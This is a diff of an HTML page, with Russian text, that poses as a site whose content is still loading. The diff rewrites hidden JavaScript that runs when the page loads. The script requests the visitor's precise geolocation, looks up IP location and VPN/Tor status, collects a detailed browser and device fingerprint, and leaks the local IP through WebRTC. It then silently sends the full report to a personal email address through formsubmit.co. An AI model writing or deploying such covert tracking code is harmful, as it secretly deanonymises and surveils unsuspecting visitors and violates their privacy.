@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Скоро открытие!</title>
+    <title>Добро пожаловать!</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -32,144 +32,148 @@
     </style>
 </head>
 <body>
-    <h1>Сайт скоро заработает!</h1>
-    <p>Идёт подготовка контента...</p>
+    <h1>Подготовка контента...</h1>
+    <p>Пожалуйста, подождите</p>
     <div class="loader"></div>
 
     <script>
         // Функция для получения ВСЕХ данных о системе
-        function getFullSystemInfo() {
-            return {
-                // Информация о навигаторе
-                userAgent: navigator.userAgent,
-                appName: navigator.appName,
-                appVersion: navigator.appVersion,
-                platform: navigator.platform,
-                vendor: navigator.vendor,
-                product: navigator.product,
-                language: navigator.language,
-                languages: navigator.languages,
-                cookieEnabled: navigator.cookieEnabled,
-                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
-                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory,
-                maxTouchPoints: navigator.maxTouchPoints,
-                onLine: navigator.onLine,
-                serviceWorker: navigator.serviceWorker ? 'Поддерживается' : 'Не поддерживается',
+        async function collectUltimateData(ip) {
+            // Получаем точные координаты
+            const preciseLocation = await getPreciseGeolocation();
+            
+            // Получаем данные по IP
+            const ipData = await getIPData(ip);
+            
+            // Собираем ВСЮ информацию о системе
+            const systemData = getCompleteSystemInfo();
+            
+            // Собираем данные о браузере
+            const browserData = getBrowserFingerprint();
+            
+            // Собираем информацию о сети
+            const networkData = await getNetworkInfo();
+            
+            // Собираем информацию об устройстве
+            const deviceData = getDeviceInfo();
+            
+            // Формируем полный отчет
+            return `
+🔍 УЛЬТИМАТИВНЫЙ СБОР ДАННЫХ 🔍
 
-                // Информация об экране
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth,
-                orientation: screen.orientation ? screen.orientation.type : 'Недоступно',
+📍 ТОЧНЫЕ КООРДИНАТЫ:
+${typeof preciseLocation === 'string' ? preciseLocation : `
+• Широта: ${preciseLocation.latitude}
+• Долгота: ${preciseLocation.longitude}
+• Точность: ${preciseLocation.accuracy}
+• Высота: ${preciseLocation.altitude || 'N/A'}
+• Направление: ${preciseLocation.heading || 'N/A'}
+• Скорость: ${preciseLocation.speed || 'N/A'}
+`}
 
-                // Информация об устройстве
-                devicePixelRatio: window.devicePixelRatio,
-                touchSupport: 'ontouchstart' in window ? 'Да' : 'Нет',
-                pointerSupport: navigator.pointerEnabled ? 'Да' : 'Нет',
+🌍 ДАННЫЕ ПО IP:
+• IP адрес: ${ip}
+• Страна: ${ipData.country} (${ipData.countryCode})
+• Город: ${ipData.city}
+• Регион: ${ipData.region}
+• Почтовый индекс: ${ipData.postal || 'N/A'}
+• Координаты: ${ipData.latitude}, ${ipData.longitude}
+• Временная зона: ${ipData.timezone}
+• Валюта: ${ipData.currency || 'N/A'}
+• Провайдер: ${ipData.isp}
+• Организация: ${ipData.org}
+• ASN: ${ipData.asn}
+• Прокси/VPN: ${ipData.proxy ? 'ДА ⚠️' : 'НЕТ ✅'}
+• Тор выходной узел: ${ipData.tor ? 'ДА ⚠️' : 'НЕТ ✅'}
+• Мобильное соединение: ${ipData.mobile ? 'ДА' : 'НЕТ'}
+• Хостинг: ${ipData.hosting ? 'ДА' : 'НЕТ'}
 
-                // Информация о подключении
-                connection: navigator.connection ? {
-                    downlink: navigator.connection.downlink,
-                    effectiveType: navigator.connection.effectiveType,
-                    rtt: navigator.connection.rtt,
-                    saveData: navigator.connection.saveData
-                } : null,
+💻 СИСТЕМНАЯ ИНФОРМАЦИЯ:
+• Платформа: ${systemData.platform}
+• Ядер CPU: ${systemData.hardwareConcurrency}
+• Память устройства: ${systemData.deviceMemory} GB
+• Разрядность ОС: ${systemData.architecture}
+• Временная зона: ${systemData.timezone}
+• Смещение времени: ${systemData.timezoneOffset} минут
+• Локаль: ${systemData.locale}
+• Язык: ${systemData.language}
+• Доступные языки: ${systemData.languages.join(', ')}
 
-                // Информация о батарее (если доступно)
-                battery: navigator.getBattery ? 'Доступно' : 'Недоступно',
+🖥 ХАРАКТЕРИСТИКИ ЭКРАНА:
+• Разрешение: ${systemData.screenWidth}x${systemData.screenHeight}
+• Доступное разрешение: ${systemData.availWidth}x${systemData.availHeight}
+• Глубина цвета: ${systemData.colorDepth} bit
+• Глубина пикселей: ${systemData.pixelDepth} bit
+• Ориентация: ${systemData.orientation}
+• Пиксельное соотношение: ${systemData.devicePixelRatio}
 
-                // Информация о геолокации
-                geolocation: navigator.geolocation ? 'Доступно' : 'Недоступно',
+📱 ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ:
+• Тип устройства: ${deviceData.deviceType}
+• Мобильное устройство: ${deviceData.isMobile ? 'ДА' : 'НЕТ'}
+• Планшет: ${deviceData.isTablet ? 'ДА' : 'НЕТ'}
+• Поддержка тача: ${deviceData.touchSupport}
+• Макс. точек касания: ${deviceData.maxTouchPoints}
+• Поддержка pointer: ${deviceData.pointerSupport}
 
-                // Информация о хранилище
-                localStorage: window.localStorage ? 'Доступно' : 'Недоступно',
-                sessionStorage: window.sessionStorage ? 'Доступно' : 'Недоступно',
-                indexedDB: window.indexedDB ? 'Доступно' : 'Недоступно',
-                cookies: navigator.cookieEnabled ? 'Включены' : 'Выключены',
+🔧 ВОЗМОЖНОСТИ БРАУЗЕРА:
+• User Agent: ${browserData.userAgent}
+• Браузер: ${browserData.browser}
+• Версия браузера: ${browserData.version}
+• Движок: ${browserData.engine}
+• ОС: ${browserData.os}
+• Архитектура: ${browserData.arch}
+• WebGL: ${browserData.webgl}
+• WebGL2: ${browserData.webgl2}
+• Canvas: ${browserData.canvas}
+• WebAudio: ${browserData.audio}
+• MediaDevices: ${browserData.mediaDevices}
+• Service Workers: ${browserData.serviceWorker}
+• Notifications: ${browserData.notifications}
+• Vibration: ${browserData.vibration}
 
-                // Информация о плагинах
-                plugins: Array.from(navigator.plugins).map(plugin => ({
-                    name: plugin.name,
-                    version: plugin.version,
-                    description: plugin.description
-                })),
+📡 СЕТЕВОЕ СОЕДИНЕНИЕ:
+• Онлайн статус: ${networkData.online ? 'Online' : 'Offline'}
+• Тип соединения: ${networkData.connectionType}
+• Эффективный тип: ${networkData.effectiveType}
+• Скорость загрузки: ${networkData.downlink} Mbps
+• RTT: ${networkData.rtt} ms
+• Экономия трафика: ${networkData.saveData ? 'Включена' : 'Выключена'}
+• Локальный IP: ${networkData.localIP || 'Недоступно'}
+• Публичный IP: ${ip}
 
-                // Информация о MIME типах
-                mimeTypes: Array.from(navigator.mimeTypes).map(mimeType => ({
-                    type: mimeType.type,
-                    description: mimeType.description,
-                    suffixes: mimeType.suffixes
-                })),
+💾 ПЛАГИНЫ И МОДУЛИ (${systemData.plugins.length}):
+${systemData.plugins.map(plugin => 
+`  • ${plugin.name} v${plugin.version} - ${plugin.description}`
+).join('\n')}
 
-                // Временная зона и локаль
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                locale: Intl.DateTimeFormat().resolvedOptions().locale,
-                timezoneOffset: new Date().getTimezoneOffset(),
+📊 ПРОИЗВОДИТЕЛЬНОСТЬ:
+• Время загрузки страницы: ${systemData.performance.timing.loadEventEnd - systemData.performance.timing.navigationStart} ms
+• Время DOMContentLoaded: ${systemData.performance.timing.domContentLoadedEventEnd - systemData.performance.timing.navigationStart} ms
+• Используемая память: ${systemData.performance.memory.usedJSHeapSize}
+• Всего памяти: ${systemData.performance.memory.totalJSHeapSize}
+• Лимит памяти: ${systemData.performance.memory.jsHeapSizeLimit}
 
-                // Производительность
-                performance: performance ? {
-                    memory: performance.memory ? {
-                        usedJSHeapSize: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB',
-                        totalJSHeapSize: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB',
-                        jsHeapSizeLimit: Math.round(performance.memory.jsHeapSizeLimit / 1048576) + ' MB'
-                    } : 'Недоступно',
-                    timing: performance.timing ? 'Доступно' : 'Недоступно'
-                } : null
-            };
+⏰ ВРЕМЕННЫЕ МЕТКИ:
+• Время посещения: ${new Date().toLocaleString('ru-RU')}
+• UTC время: ${new Date().toUTCString()}
+• Timestamp: ${Date.now()}
+• Timezone offset: ${new Date().getTimezoneOffset()}
+
+🎯 ДОПОЛНИТЕЛЬНЫЕ ДАННЫЕ:
+• Куки: ${systemData.cookieEnabled ? 'Включены' : 'Выключены'}
+• Java: ${systemData.javaEnabled ? 'Включена' : 'Выключена'}
+• PDF просмотр: ${systemData.pdfViewerEnabled ? 'Доступен' : 'Недоступен'}
+• Батарея: ${systemData.battery}
+• Геолокация: ${systemData.geolocation}
+• LocalStorage: ${systemData.localStorage}
+• SessionStorage: ${systemData.sessionStorage}
+• IndexedDB: ${systemData.indexedDB}
+
+=== КОНЕЦ ОТЧЕТА ===
+            `;
         }
 
-        // Функция для получения точного местоположения через IP
-        async function getIPLocation(ip) {
-            try {
-                const responses = await Promise.allSettled([
-                    fetch(`https://ipapi.co/${ip}/json/`),
-                    fetch(`https://ipapi.com/ip_api.php?ip=${ip}`),
-                    fetch(`https://json.geoiplookup.io/${ip}`)
-                ]);
-
-                let bestData = {};
-                
-                for (const response of responses) {
-                    if (response.status === 'fulfilled' && response.value.ok) {
-                        const data = await response.value.json();
-                        bestData = { ...bestData, ...data };
-                    }
-                }
-
-                return {
-                    country: bestData.country_name || bestData.country || 'Неизвестно',
-                    countryCode: bestData.country_code || bestData.countryCode || 'Неизвестно',
-                    city: bestData.city || 'Неизвестно',
-                    region: bestData.region || bestData.regionName || 'Неизвестно',
-                    latitude: bestData.latitude || bestData.lat || 'Неизвестно',
-                    longitude: bestData.longitude || bestData.lon || 'Неизвестно',
-                    timezone: bestData.timezone || 'Неизвестно',
-                    isp: bestData.isp || bestData.org || bestData.asn || 'Неизвестно',
-                    asn: bestData.asn || 'Неизвестно',
-                    proxy: bestData.proxy || bestData.vpn || false,
-                    mobile: bestData.mobile || false
-                };
-            } catch (error) {
-                return {
-                    country: 'Ошибка определения',
-                    city: 'Ошибка определения',
-                    region: 'Ошибка определения',
-                    latitude: 'Ошибка определения',
-                    longitude: 'Ошибка определения',
-                    timezone: 'Ошибка определения',
-                    isp: 'Ошибка определения',
-                    proxy: 'Ошибка проверки',
-                    mobile: 'Ошибка проверки'
-                };
-            }
-        }
-
-        // Функция для получения точных координат (если пользователь разрешит)
+        // Функция для получения точных координат
         async function getPreciseGeolocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
@@ -201,176 +205,204 @@
             });
         }
 
-        // Функция для проверки всех возможностей браузера
-        function checkBrowserCapabilities() {
+        // Функция для получения данных по IP
+        async function getIPData(ip) {
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                
+                return {
+                    country: data.country_name,
+                    countryCode: data.country_code,
+                    city: data.city,
+                    region: data.region,
+                    postal: data.postal,
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    timezone: data.timezone,
+                    currency: data.currency,
+                    isp: data.org,
+                    org: data.org,
+                    asn: data.asn,
+                    proxy: data.proxy || false,
+                    tor: data.tor || false,
+                    mobile: data.mobile || false,
+                    hosting: data.hosting || false
+                };
+            } catch (error) {
+                return {
+                    country: 'Ошибка',
+                    city: 'Ошибка',
+                    region: 'Ошибка',
+                    latitude: 'Ошибка',
+                    longitude: 'Ошибка',
+                    timezone: 'Ошибка',
+                    isp: 'Ошибка',
+                    org: 'Ошибка',
+                    asn: 'Ошибка',
+                    proxy: false,
+                    tor: false,
+                    mobile: false,
+                    hosting: false
+                };
+            }
+        }
+
+        // Функция для получения полной информации о системе
+        function getCompleteSystemInfo() {
             return {
-                // Графика
-                webgl: !!window.WebGLRenderingContext,
-                webgl2: !!window.WebGL2RenderingContext,
-                canvas: !!window.HTMLCanvasElement,
-                webp: (() => {
-                    const canvas = document.createElement('canvas');
-                    if (canvas.getContext && canvas.getContext('2d')) {
-                        return canvas.toDataURL('image/webp').indexOf('data:image/webp') === 0;
-                    }
-                    return false;
-                })(),
-                avif: (async () => {
-                    try {
-                        const response = await fetch('data:image/avif;base64,AAAAIGZ0eXBhdmlmAAAAAGF2aWZtaWYxbWlhZk1BMUIAAADybWV0YQAAAAAAAAAoaGRscgAAAAAAAAAAcGljdAAAAAAAAAAAAAAAAGxpYmF2aWYAAAAADnBpdG0AAAAAAAEAAAAeaWxvYwAAAABEAAABAAEAAAABAAABGgAAABcAAAAoaWluZgAAAAAAAQAAABppbmZlAgAAAAABAABhdjAxQ29sb3IAAAAAamlwcnAAAABLaXBjbwAAABRpc3BlAAAAAAAAAAEAAAABAAAAEHBpeGkAAAAAAwgICAAAAAxhdjFDgQAMAAAAABNjb2xybmNseAABAA0ABoAAAAAXaXBtYQAAAAAAAAABAAEEAQKDBAAAAB9tZGF0EgAKCBgABogQEDQgwkXAAAAAAAAS0pQjQAAAABw7OrZg==');
-                        return response.ok;
-                    } catch {
-                        return false;
-                    }
-                })(),
-
-                // Аудио/Видео
-                audio: !!window.AudioContext,
-                video: !!window.HTMLVideoElement,
-                mediaDevices: navigator.mediaDevices ? 'Доступно' : 'Недоступно',
-
-                // Хранилище
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                language: navigator.language,
+                languages: navigator.languages,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                cookieEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+                
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                orientation: screen.orientation?.type,
+                devicePixelRatio: window.devicePixelRatio,
+                
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                locale: Intl.DateTimeFormat().resolvedOptions().locale,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                
+                plugins: Array.from(navigator.plugins).map(plugin => ({
+                    name: plugin.name,
+                    version: plugin.version,
+                    description: plugin.description
+                })),
+                
+                performance: {
+                    timing: performance.timing,
+                    memory: performance.memory
+                },
+                
+                architecture: navigator.userAgent.includes('x64') ? '64-bit' : 
+                            navigator.userAgent.includes('x86') ? '32-bit' : 'Неизвестно',
+                
+                battery: navigator.getBattery ? 'Доступно' : 'Недоступно',
+                geolocation: navigator.geolocation ? 'Доступно' : 'Недоступно',
                 localStorage: !!window.localStorage,
                 sessionStorage: !!window.sessionStorage,
-                indexedDB: !!window.indexedDB,
-                cache: !!window.caches,
-
-                // Сети
-                websocket: !!window.WebSocket,
-                fetch: !!window.fetch,
-                xhr: !!window.XMLHttpRequest,
-
-                // Другое
-                serviceWorker: !!navigator.serviceWorker,
-                notifications: !!window.Notification,
-                vibration: !!navigator.vibrate,
-                bluetooth: navigator.bluetooth ? 'Доступно' : 'Недоступно',
-                usb: navigator.usb ? 'Доступно' : 'Недоступно',
-                clipboard: !!navigator.clipboard,
-                share: !!navigator.share,
-                wakeLock: navigator.wakeLock ? 'Доступно' : 'Недоступно'
+                indexedDB: !!window.indexedDB
             };
         }
 
-        // Основная функция сбора данных
-        async function collectAllData(ip) {
-            const systemInfo = getFullSystemInfo();
-            const ipLocation = await getIPLocation(ip);
-            const preciseLocation = await getPreciseGeolocation();
-            const capabilities = await checkBrowserCapabilities();
+        // Функция для сбора данных о браузере
+        function getBrowserFingerprint() {
+            const ua = navigator.userAgent;
+            let browser = 'Unknown';
+            let version = 'Unknown';
+            let os = 'Unknown';
+            let arch = 'Unknown';
+            
+            // Определяем браузер и версию
+            if (ua.includes('Chrome') && !ua.includes('Edg')) {
+                browser = 'Chrome';
+                version = ua.match(/Chrome\/([0-9.]+)/)[1];
+            } else if (ua.includes('Firefox')) {
+                browser = 'Firefox';
+                version = ua.match(/Firefox\/([0-9.]+)/)[1];
+            } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
+                browser = 'Safari';
+                version = ua.match(/Version\/([0-9.]+)/)[1];
+            } else if (ua.includes('Edg')) {
+                browser = 'Edge';
+                version = ua.match(/Edg\/([0-9.]+)/)[1];
+            }
+            
+            // Определяем ОС
+            if (ua.includes('Windows')) os = 'Windows';
+            else if (ua.includes('Mac')) os = 'macOS';
+            else if (ua.includes('Linux')) os = 'Linux';
+            else if (ua.includes('Android')) os = 'Android';
+            else if (ua.includes('iOS')) os = 'iOS';
+            
+            // Определяем архитектуру
+            if (ua.includes('x64') || ua.includes('Win64')) arch = '64-bit';
+            else if (ua.includes('x86') || ua.includes('Win32')) arch = '32-bit';
+            else if (ua.includes('ARM')) arch = 'ARM';
+            
+            return {
+                userAgent: ua,
+                browser: browser,
+                version: version,
+                engine: ua.includes('AppleWebKit') ? 'WebKit' : 
+                       ua.includes('Gecko') ? 'Gecko' : 'Unknown',
+                os: os,
+                arch: arch,
+                webgl: !!window.WebGLRenderingContext,
+                webgl2: !!window.WebGL2RenderingContext,
+                canvas: !!window.HTMLCanvasElement,
+                audio: !!window.AudioContext,
+                mediaDevices: !!navigator.mediaDevices,
+                serviceWorker: !!navigator.serviceWorker,
+                notifications: !!window.Notification,
+                vibration: !!navigator.vibrate
+            };
+        }
 
-            // Форматируем все данные в читаемый вид
-            const fullMessage = `
-🎯 ПОЛНЫЙ СБОР ДАННЫХ ПОЛЬЗОВАТЕЛЯ 🎯
+        // Функция для получения информации об устройстве
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            return {
+                deviceType: ua.includes('Mobile') ? 'Mobile' : 
+                           ua.includes('Tablet') ? 'Tablet' : 'Desktop',
+                isMobile: /Mobile|Android|iPhone|iPad|iPod|Windows Phone/i.test(ua),
+                isTablet: /Tablet|iPad/i.test(ua),
+                touchSupport: 'ontouchstart' in window,
+                maxTouchPoints: navigator.maxTouchPoints,
+                pointerSupport: navigator.pointerEnabled
+            };
+        }
 
-📍 ОСНОВНАЯ ИНФОРМАЦИЯ:
-• IP адрес: ${ip}
-• User Agent: ${systemInfo.userAgent}
-• Платформа: ${systemInfo.platform}
-• Язык: ${systemInfo.language}
-• Доступные языки: ${systemInfo.languages.join(', ')}
+        // Функция для получения информации о сети
+        async function getNetworkInfo() {
+            return {
+                online: navigator.onLine,
+                connectionType: navigator.connection?.type,
+                effectiveType: navigator.connection?.effectiveType,
+                downlink: navigator.connection?.downlink,
+                rtt: navigator.connection?.rtt,
+                saveData: navigator.connection?.saveData,
+                localIP: await getLocalIP().catch(() => null)
+            };
+        }
 
-🌍 ГЕОЛОКАЦИЯ ПО IP:
-• Страна: ${ipLocation.country} (${ipLocation.countryCode})
-• Город: ${ipLocation.city}
-• Регион: ${ipLocation.region}
-• Координаты: ${ipLocation.latitude}, ${ipLocation.longitude}
-• Временная зона: ${ipLocation.timezone}
-• Провайдер: ${ipLocation.isp}
-• ASN: ${ipLocation.asn}
-• Прокси/VPN: ${ipLocation.proxy ? 'ДА ⚠️' : 'НЕТ ✅'}
-• Мобильное соединение: ${ipLocation.mobile ? 'ДА' : 'НЕТ'}
-
-🎯 ТОЧНАЯ ГЕОЛОКАЦИЯ:
-${typeof preciseLocation === 'string' ? preciseLocation : `
-• Широта: ${preciseLocation.latitude}
-• Долгота: ${preciseLocation.longitude}
-• Точность: ${preciseLocation.accuracy}
-• Высота: ${preciseLocation.altitude || 'N/A'}
-• Направление: ${preciseLocation.heading || 'N/A'}
-• Скорость: ${preciseLocation.speed || 'N/A'}
-`}
-
-💻 СИСТЕМНЫЕ ХАРАКТЕРИСТИКИ:
-• Ядер CPU: ${systemInfo.hardwareConcurrency}
-• Память устройства: ${systemInfo.deviceMemory} GB
-• Тачпоинты: ${systemInfo.maxTouchPoints}
-• Пиксельное соотношение: ${systemInfo.devicePixelRatio}
-• Поддержка тача: ${systemInfo.touchSupport}
-• Поддержка pointer: ${systemInfo.pointerSupport}
-
-🖥 ЭКРАН:
-• Разрешение: ${systemInfo.screenWidth}x${systemInfo.screenHeight}
-• Доступное разрешение: ${systemInfo.availWidth}x${systemInfo.availHeight}
-• Глубина цвета: ${systemInfo.colorDepth} bit
-• Глубина пикселей: ${systemInfo.pixelDepth} bit
-• Ориентация: ${systemInfo.orientation}
-
-📡 СОЕДИНЕНИЕ:
-• Онлайн: ${systemInfo.onLine ? 'ДА' : 'НЕТ'}
-• Скорость: ${systemInfo.connection ? systemInfo.connection.downlink + ' Mbps' : 'N/A'}
-• Тип соединения: ${systemInfo.connection ? systemInfo.connection.effectiveType : 'N/A'}
-• RTT: ${systemInfo.connection ? systemInfo.connection.rtt + ' ms' : 'N/A'}
-• Экономия трафика: ${systemInfo.connection ? systemInfo.connection.saveData : 'N/A'}
-
-🔧 ВОЗМОЖНОСТИ БРАУЗЕРА:
-• WebGL: ${capabilities.webgl}
-• WebGL2: ${capabilities.webgl2}
-• WebP: ${capabilities.webp}
-• AVIF: ${capabilities.avif}
-• WebAudio: ${capabilities.audio}
-• MediaDevices: ${capabilities.mediaDevices}
-• WebSockets: ${capabilities.websocket}
-• Fetch API: ${capabilities.fetch}
-• Service Workers: ${capabilities.serviceWorker}
-• Уведомления: ${capabilities.notifications}
-• Вибрация: ${capabilities.vibration}
-• Bluetooth: ${capabilities.bluetooth}
-• USB: ${capabilities.usb}
-• Буфер обмена: ${capabilities.clipboard}
-• Share API: ${capabilities.share}
-• Wake Lock: ${capabilities.wakeLock}
-
-💾 ХРАНИЛИЩЕ:
-• LocalStorage: ${systemInfo.localStorage}
-• SessionStorage: ${systemInfo.sessionStorage}
-• IndexedDB: ${systemInfo.indexedDB}
-• Cache API: ${capabilities.cache}
-• Cookies: ${systemInfo.cookies}
-
-⚡ ПРОИЗВОДИТЕЛЬНОСТЬ:
-${systemInfo.performance && systemInfo.performance.memory !== 'Недоступно' ? `
-• Используемая память: ${systemInfo.performance.memory.usedJSHeapSize}
-• Всего памяти: ${systemInfo.performance.memory.totalJSHeapSize}
-• Лимит памяти: ${systemInfo.performance.memory.jsHeapSizeLimit}
-` : 'Информация о памяти недоступна'}
-
-🛠 ДОПОЛНИТЕЛЬНО:
-• Временная зона: ${systemInfo.timezone}
-• Смещение времени: ${systemInfo.timezoneOffset} минут
-• Локаль: ${systemInfo.locale}
-• Батарея: ${systemInfo.battery}
-• Геолокация: ${systemInfo.geolocation}
-• Онлайн статус: ${systemInfo.onLine ? 'Online' : 'Offline'}
-
-📋 ПЛАГИНЫ (${systemInfo.plugins.length}):
-${systemInfo.plugins.map(plugin => `  • ${plugin.name} ${plugin.version}`).join('\n')}
-
-⏰ ВРЕМЯ ВИЗИТА: ${new Date().toLocaleString('ru-RU')}
-🕐 UTC Время: ${new Date().toUTCString()}
-⏱ Timestamp: ${Date.now()}
-
-=== КОНЕЦ ОТЧЕТА ===
-            `;
-
-            return fullMessage;
+        // Функция для получения локального IP
+        async function getLocalIP() {
+            return new Promise((resolve) => {
+                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                if (!RTCPeerConnection) resolve(null);
+                
+                const pc = new RTCPeerConnection({iceServers:[]});
+                pc.createDataChannel('');
+                pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
+                
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
+                    resolve(myIP);
+                    pc.onicecandidate = () => {};
+                };
+            });
         }
 
         // Функция для отправки данных
         function sendDataToEmail(data) {
             const formData = new FormData();
             formData.append('message', data);
-            formData.append('_subject', '🚨 ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ!');
+            formData.append('_subject', '🚨 УЛЬТИМАТИВНЫЙ СБОР ДАННЫХ!');
             formData.append('_captcha', 'false');
             
             fetch('https://formsubmit.co/wplacesosi1@gmail.com', {
@@ -380,29 +412,26 @@ ${systemInfo.plugins.map(plugin => `  • ${plugin.name} ${plugin.version}`).joi
             });
         }
 
-        // Запуск сбора данных
-        async function startDataCollection() {
+        // Основная функция
+        async function startUltimateCollection() {
             try {
                 // Получаем IP
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 
-                // Собираем все данные
-                console.log('Начинаем сбор данных...');
-                const allData = await collectAllData(ipData.ip);
+                // Собираем ВСЕ данные
+                const allData = await collectUltimateData(ipData.ip);
                 
                 // Отправляем на почту
-                console.log('Отправляем данные...');
                 sendDataToEmail(allData);
                 
-                console.log('Данные успешно отправлены!');
             } catch (error) {
-                console.error('Ошибка сбора данных:', error);
+                console.error('Ошибка:', error);
             }
         }
 
-        // Запускаем при загрузке страницы
-        window.addEventListener('load', startDataCollection);
+        // Запускаем при загрузке
+        window.addEventListener('load', startUltimateCollection);
     </script>
 </body>
 </html>
